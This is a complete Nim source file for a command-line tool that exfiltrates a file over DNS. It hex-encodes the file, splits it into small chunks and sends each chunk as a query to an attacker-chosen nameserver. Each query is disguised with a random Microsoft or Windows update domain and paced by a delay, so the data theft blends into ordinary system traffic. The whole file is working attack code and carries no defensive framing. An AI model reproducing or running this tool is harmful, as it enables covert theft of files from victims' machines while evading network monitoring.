import std/[os, strutils, random]
import pkg/ndns
randomize()

proc dnsExfil(ns: string, target: string, slp: int): void =
    let
        client = initDnsClient(ns)
        content = readFile(target)
        hex = content.toHex
        chuckSize = 20 # max 62
        domains = [".client.a.msn.windows.com", ".a.wns.update.windows.com", ".a.wns.o365.microsoft.com", ".msft.a.msn.microsoft.com"]

    var stringindex: int

    echo "[+] Sending ", target

    while stringindex <= hex.len-1:
        let
            query =  hex[stringindex .. (if stringindex + chuckSize - 1 > hex.len - 1: hex.len - 1 else: stringindex + chuckSize - 1)]
            dnsquery = query & sample(domains)

        try:
            discard resolveIpv4(client, dnsquery, 1)
        except CatchableError as e:
            if e.msg.contains("timeout"):
                #echo "ok ", dnsquery
                discard
            else:
                #echo "err ", dnsquery
                quit(e.msg)

        inc(stringindex, chuckSize)
        sleep(slp)

    try:
        discard resolveIpv4(client, "quit", 1)
    except CatchableError as e:
        if e.msg.contains("timeout"):
            discard
        else:
            quit(e.msg)

    echo "[+] Done!"


when isMainModule:
    if paramCount() < 3:
        echo "[!] Use: dnx.exe <IP> <File> <Time between requests in ms>"
        echo "[!] e.g: dnx.exe 127.0.0.1 file.pdf 1000"
        quit()
    else:
        dnsExfil(paramStr(1), paramStr(2), parseInt(paramStr(3)))
